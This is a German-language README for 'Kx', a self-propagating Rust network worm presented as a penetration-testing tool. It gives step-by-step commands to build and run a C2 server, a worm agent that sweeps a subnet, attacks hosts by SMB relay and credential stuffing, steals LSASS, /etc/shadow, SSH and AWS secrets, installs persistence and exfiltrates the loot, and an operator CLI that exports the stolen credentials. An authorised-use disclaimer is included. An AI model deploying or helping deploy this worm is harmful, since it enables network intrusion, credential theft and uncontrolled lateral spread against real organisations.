# Kx — Post-Quantum-Netzwerkwurm für autorisierte Penetrationstests

> **WICHTIG:** Dieses Tool ist ausschließlich für **autorisierte** Penetrationstests
> und Red-Team-Übungen gedacht. Der Einsatz auf Systemen, die dir nicht gehören,
> ohne ausdrückliche Genehmigung, ist **illegal** und kann strafrechtlich verfolgt werden.

---

## Was ist Kx?

Kx ist ein modularer, autonomer Netzwerkwurm, geschrieben in Rust. Er durchläuft einen
vollständigen Angriffspfad:

1. **Entdeckung** — findet lebende Hosts im Netz (ARP-Sweep)
2. **Scan** — ermittelt offene Ports und Dienste
3. **Exploit** — kompromittiert erreichbare Systeme (SMB-Relay, Credential-Stuffing)
4. **Extraktion** — holt Passwörter, Hashes und Keys vom eroberten Host
5. **Persistenz** — installiert sich dauerhaft (Windows-Dienst, systemd, Cron)
6. **Reporting** — meldet alles verschlüsselt an eine zentrale C2-Steuerung

Alle erbeuteten Daten werden **post-quantum-verschlüsselt** (ML-KEM + Kyber) und über eine
TLS-gesicherte, token-basierte API an den Operator-Server übertragen.

---

## Architektur

```
┌─────────────┐   TLS/JSON    ┌─────────────┐
│  kx-cli     │──────────────▶│  kx-server  │
│ (Operator)  │  Bearer-Token │  (C2-Backend)│
└─────────────┘               └──────┬──────┘
                                      │ SQLite
                                      ▼
                               ┌─────────────┐
                               │  Datenbank   │
                               └─────────────┘

        Netzwerk (autorisiert)
┌─────────────┐   ARP/TCP    ┌─────────────┐
│  kx-agent   │──────────────▶│  Zielsystem  │
│ (Wurm)      │  Exploit      │ (Windows/POSIX)│
└──────┬──────┘               └─────────────┘
       │ Secrets/Persistenz
       ▼
  kx-win / kx-posix
```

### Die 9 Crates

| Crate       | Aufgabe                                              |
|-------------|------------------------------------------------------|
| `kx-core`   | Kryptografie, KXENC-Dateiformat, Hilfsfunktionen    |
| `kx-scanner`| ARP-Hostentdeckung, TCP-Portscan                    |
| `kx-exploit`| SMB-Relay, WMI-Execution, Credential-Stuffing       |
| `kx-win`    | Windows-Secrets (LSASS, Credential Manager) + Persistenz |
| `kx-posix`  | Linux-Secrets (/etc/shadow, SSH, AWS) + systemd/Cron|
| `kx-tls`    | Selbstsignierte Zertifikate, rustls-Konfiguration   |
| `kx-server` | C2-Backend: axum-API, SQLite, Dashboard             |
| `kx-agent`  | Der autonome Wurm: orchestriert Scan→Exploit→Report |
| `kx-cli`    | Operator-Oberfläche zum Abfragen/Exportieren        |

---

## Voraussetzungen

### 1. Rust-Toolchain installieren

```bash
# rustup installieren (falls nicht vorhanden)
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# PATH setzen (oder neu anmelden)
export PATH="$HOME/.cargo/bin:$PATH"

# Prüfen
rustc --version   # sollte >= 1.77 sein
cargo --version
```

### 2. Externe Exploit-Tools (optional, für reale Exploits)

Kx nutzt **Impacket** für SMB-Relay und WMI-Execution. Diese müssen separat
installiert sein:

```bash
git clone https://github.com/fortra/impacket.git
cd impacket
pip install -r requirements.txt
```

Die Pfade zu `smbrelayx.py` und `wmiexec.py` werden dem Agent übergeben
(siehe unten). Ohne diese Tools läuft der Agent nur im Scan-Modus.

### 3. Linux-Sysdeps (für ARP-Scan)

```bash
# Debian/Kali
sudo apt install libpcap-dev
```

---

## Build

```bash
cd kx

# Debug-Build (schnell, für Entwicklung)
cargo build

# Release-Build (optimiert, für Produktivbetrieb)
cargo build --release

# Tests ausführen
cargo test
```

Nach dem Build liegen die Binaries in `target/debug/` (bzw. `target/release/`):
- `kx-server` — der C2-Backend-Server
- `kx-agent` — der autonome Wurm
- `kx-cli` — die Operator-Oberfläche
- `kx-core` — Bibliothek (kein Binary)

---

## Schritt-für-Schritt-Nutzung

### Schritt 1: C2-Server starten

Der Server erzeugt automatisch ein selbstsigniertes TLS-Zertifikat und eine
SQLite-Datenbank. Starte ihn auf einem zentralen Rechner:

```bash
# Mit festem Token (empfohlen)
./target/debug/kx-server \
  --host 0.0.0.0 \
  --port 8443 \
  --db /tmp/kx.db \
  --token mein_geheimes_token \
  --cn kx.local
```

**Output:**
```
Kx-Server lauscht auf https://0.0.0.0:8443
API-Endpunkte:
  POST /api/register   Host registrieren
  POST /api/heartbeat  Host-Heartbeat senden
  POST /api/secrets    Secret hochladen
  GET  /api/hosts      Alle Hosts
  GET  /api/secrets    Alle Secrets
  GET  /api/tasks      Alle Tasks
```

> **Hinweis:** Das selbstsignierte Zertifikat wird in `kx-server.crt` /
> `kx-server.key` geschrieben. Du brauchst das Zertifikat später für Agent/CLI.
> Wenn kein Token gesetzt wird, erzeugt der Server ein zufälliges und gibt es aus.

### Schritt 2: Agent (Wurm) ausführen

Der Agent läuft auf einem bereits kompromittierten oder testbaren System und
propagiert sich ins Netzwerk. Er braucht den Server-Zertifikat-Pfad:

```bash
./target/debug/kx-agent \
  --server https://192.168.1.10:8443 \
  --token mein_geheimes_token \
  --server-cert /pfad/zu/kx-server.crt \
  --iface eth0 \
  --start 192.168.1.1 \
  --end 192.168.1.254 \
  --own-ip 192.168.1.10 \
  --relay-script /pfad/zu/impacket/smbrelayx.py \
  --wmi-script /pfad/zu/impacket/wmiexec.py
```

Der Agent wird jetzt:
1. Den ARP-Sweep auf `eth0` im Bereich `192.168.1.1`–`192.168.1.254` ausführen
2. Offene Ports scannen
3. Windows-Systeme per SMB-Relay angreifen
4. SSH-Systeme per Credential-Stuffing testen
5. Lokale Secrets extrahieren und hochladen
6. systemd/Cron-Persistenz installieren
7. Alle Ergebnisse an den C2-Server melden

### Schritt 3: Ergebnisse mit der CLI abfragen

Von einem Operator-Rechner aus:

```bash
# Alle erkannten Hosts anzeigen
./target/debug/kx-cli \
  --server https://192.168.1.10:8443 \
  --token mein_geheimes_token \
  --cert /pfad/zu/kx-server.crt \
  hosts

# Alle Secrets anzeigen (optional gefiltert)
./target/debug/kx-cli \
  --server https://192.168.1.10:8443 \
  --token mein_geheimes_token \
  --cert /pfad/zu/kx-server.crt \
  secrets --user admin

# Secrets als CSV exportieren
./target/debug/kx-cli \
  --server https://192.168.1.10:8443 \
  --token mein_geheimes_token \
  --cert /pfad/zu/kx-server.crt \
  export /tmp/erbeute.csv --format csv
```

### Schritt 4: Dashboard im Browser

Öffne im Browser: `https://<server-ip>:8443/?token=mein_geheimes_token`
Das Dashboard zeigt Hosts, Secrets und Tasks live an.

---

## Konfigurationsreferenz

### kx-server

| Option | Beschreibung | Standard |
|--------|--------------|----------|
| `--host` | Bind-Adresse | `127.0.0.1` |
| `--port` | Port | `8443` |
| `--db` | SQLite-Pfad | `kx.db` |
| `--token` | Bearer-Token (oder `KX_SERVER_TOKEN`) | zufällig |
| `--cn` | Zertifikat-CN | `kx.local` |

### kx-agent

| Option | Beschreibung | Standard |
|--------|--------------|----------|
| `--server` | C2-URL (oder `KX_C2_URL`) | — |
| `--token` | Bearer-Token (oder `KX_C2_TOKEN`) | — |
| `--server-cert` | Server-Zertifikat (PEM) | — |
| `--iface` | Netzwerk-Interface | `eth0` |
| `--start`/`--end` | Scan-Bereich | — |
| `--own-ip` | Eigene IP | `192.168.1.100` |
| `--hosts` | Host-Liste (umgeht ARP) | — |
| `--relay-script` | smbrelayx.py-Pfad | `smbrelayx.py` |
| `--wmi-script` | wmiexec.py-Pfad | `wmiexec.py` |

### kx-cli

| Option | Beschreibung |
|--------|--------------|
| `--server` | C2-URL |
| `--token` | Bearer-Token |
| `--cert` | Server-Zertifikat (PEM) |
| `hosts`/`secrets`/`tasks`/`export` | Subcommands |

---

## Sicherheitshinweise

- **Nur autorisierte Netzwerke!** Kein Einsatz ohne schriftliche Genehmigung.
- **Token schützen:** Das Bearer-Token gibt vollen Zugriff auf die API.
- **TLS:** Der Server nutzt selbstsignierte Zertifikate; Client-Seite muss das Zertifikat explizit vertrauen.
- **Persistenz entfernen:** Nach dem Test die installierten Dienste/Cron-Jobs manuell entfernen.

---

## Projektstruktur

```
kx/
├── Cargo.toml              # Workspace-Definition
├── crates/
│   ├── kx-core/            # Kryptografie + KXENC-Format
│   ├── kx-scanner/         # ARP + TCP-Scan
│   ├── kx-exploit/         # SMB-Relay, WMI, Credential-Stuffing
│   ├── kx-win/             # Windows-Post-Exploitation
│   ├── kx-posix/           # Linux-Post-Exploitation
│   ├── kx-tls/             # TLS-Infrastruktur
│   ├── kx-server/          # C2-Backend
│   ├── kx-agent/           # Autonomer Wurm
│   └── kx-cli/             # Operator-CLI
└── README.md               # Diese Datei
```

---

## Troubleshooting

| Problem | Lösung |
|---------|--------|
| `cargo: command not found` | `export PATH="$HOME/.cargo/bin:$PATH"` |
| ARP-Sweep fehlerhaft | Interface prüfen, Root-Rechte sicherstellen |
| SMB-Relay schlägt fehl | Impacket installiert? Ziel-System Windows? |
| TLS-Fehler beim Agent | Korrektes `--server-cert` übergeben |
| `Database is locked` | Nur ein Server-Instanz pro DB-Datei |

---

## Lizenz & Haftung

Dieses Werkzeug ist für **legitime Sicherheitsforschung** gedacht. Der Autor
übernimmt keine Haftung für missbräuchliche Verwendung. Du allein bist
verantwortlich, sicherzustellen, dass dein Einsatz legal ist.
